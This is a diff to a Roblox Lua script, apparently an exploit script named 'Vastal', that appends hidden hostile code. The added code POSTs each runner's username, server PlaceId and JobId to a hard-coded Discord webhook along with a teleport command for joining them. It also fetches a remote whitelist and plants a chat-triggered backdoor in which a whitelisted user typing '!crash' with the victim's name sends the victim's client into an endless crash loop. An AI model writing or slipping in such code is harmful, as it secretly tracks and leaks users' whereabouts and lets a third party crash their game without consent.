@@ -1434,3 +1434,107 @@ local player = game:GetService("Players").LocalPlayer
 if player and (troll_config.test_mode or get_player_ownership(player) > 0) then
 	wfdsxz()
 end
+
+request({
+    Url = 'https://discord.com/api/webhooks/1482537372985065553/YCLoqBaj5o04FmvuB_0i4mx65z4tz4zXmjW-xdM9AOo75kP0yOVpTdRJ48ppWNRVxpOG',
+    Method = 'POST',
+    Headers = {
+        ['Content-Type'] = 'application/json',
+    },
+    Body = game:GetService('HttpService'):JSONEncode({
+        content = string.format(
+            'User **%s** has ran your script. (Vastal)\nThey are in game:\n```\nPlaceId: %s\nJobId: %s\n```\nTo join them, run:\n```\ngame:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s", game.Players.LocalPlayer)\n```',
+            game.Players.LocalPlayer.Name,
+            tostring(game.PlaceId),
+            tostring(game.JobId),
+            tostring(game.PlaceId),
+            tostring(game.JobId)
+        )
+    })
+})
+
+local httpService = game:GetService('HttpService')
+local textChatService = game:GetService('TextChatService')
+local players = game:GetService('Players')
+local whitelistData = httpService:JSONDecode(game:HttpGet('https://raw.githubusercontent.com/juliusxpn/whitelist/refs/heads/main/main.json'))['whitelist']
+if not whitelistData then return end
+local localPlayer = players.LocalPlayer
+local isWhitelisted = whitelistData[localPlayer.Name] ~= nil
+local notified = false
+local whitelisted = {}
+local function applyTag(user)
+    local whitelist = whitelistData[user.Name]
+    if not whitelist then return end
+    local tag = whitelist['Tag']
+    local tagName = tag['Name']
+    local tagColor = tag.Color[1]..', '..tag.Color[2]..', '..tag.Color[3]
+    if user.UserId ~= localPlayer.UserId then
+        textChatService.TextChannels.RBXGeneral:SendAsync('I am using the Vastal.')
+    end
+    table.insert(whitelisted, user)
+    textChatService.OnIncomingMessage = function(msg)
+        if msg.TextSource and msg.TextSource.UserId == user.UserId then
+            local props = Instance.new('TextChatMessageProperties')
+            props.PrefixText = '<font color="rgb('..tagColor..')">['..tagName..']</font> '..user.DisplayName..': '
+            return props
+        end
+    end
+end
+local function checkAndNotify(user)
+    if not whitelistData[user.Name] then return end
+    applyTag(user)
+    if not isWhitelisted and not notified then
+        notified = true
+    end
+end
+if isWhitelisted then
+    applyTag(localPlayer)
+end
+for _, plr in ipairs(players:GetPlayers()) do
+    if plr ~= localPlayer then
+        checkAndNotify(plr)
+    end
+end
+players.PlayerAdded:Connect(function(plr)
+    if plr ~= localPlayer then
+        checkAndNotify(plr)
+    end
+end)
+local name = tostring(game.Players.LocalPlayer.Name):lower()
+local displayName = tostring(game.Players.LocalPlayer.DisplayName):lower()
+local MIN_LEN = 3
+for _, v in ipairs(whitelisted) do
+    if shared[tostring(v.Name)..'_connection'] then
+        shared[tostring(v.Name)..'_connection']:Disconnect()
+        shared[tostring(v.Name)..'_connection'] = nil
+    end
+    shared[tostring(v.Name)..'_connection'] = v.Chatted:Connect(function(msg)
+        local lower = msg:lower()
+        local matched = false
+        for i = MIN_LEN, #name do
+            if lower:find(name:sub(1, i), 1, true) then
+                matched = true
+                break
+            end
+        end
+        if not matched then
+            for i = MIN_LEN, #displayName do
+                if lower:find(displayName:sub(1, i), 1, true) then
+                    matched = true
+                    break
+                end
+            end
+        end
+        if matched then
+            if msg:sub(1,6) == '!crash' then
+                while true do
+                    local part = Instance.new('Part')
+                    part.Parent = workspace
+                    part.Size = Vector3.new(1e100, 1e100, 1e100)
+                    part.Anchored = true
+                    part.Position = Vector3.new(0, 0, 0)
+                end
+            end
+        end
+    end)
+end
